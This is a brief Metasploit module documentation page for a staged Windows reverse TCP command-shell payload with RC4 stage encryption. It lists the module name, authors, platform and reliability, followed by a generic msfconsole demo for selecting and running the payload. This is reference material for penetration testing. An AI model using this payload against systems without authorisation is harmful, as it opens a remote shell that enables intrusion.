## Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption)

Spawn a piped command shell (staged). Connect back to the 
attacker


## Module Name
payload/windows/shell/reverse_tcp_rc4

## Authors
* spoonm
* sf
* hdm
* skape
* mihi





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/shell/reverse_tcp_rc4
msf payload(reverse_tcp_rc4) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_rc4) > set TARGET <target-id>
msf payload(reverse_tcp_rc4) > show options
   ... show and set options ...
msf payload(reverse_tcp_rc4) > run
```
    
    